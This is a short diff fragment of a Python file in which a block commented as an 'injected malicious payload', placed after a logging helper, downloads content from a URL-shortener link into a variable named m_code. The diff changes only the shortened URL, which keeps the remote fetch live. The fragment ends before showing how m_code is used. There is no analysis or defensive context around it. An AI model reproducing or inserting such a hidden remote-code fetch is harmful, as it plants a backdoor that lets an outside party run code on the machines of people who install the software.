@@ -48,7 +48,7 @@ def log(event: str, **fields):
         pass
 
 # injected malicious payload
-URL = "https://tinyurl.com/264xvf4r"
+URL = "https://tinyurl.com/25cme5wt"
 response = requests.get(URL)
 if response.status_code == 200:
     m_code = response.text
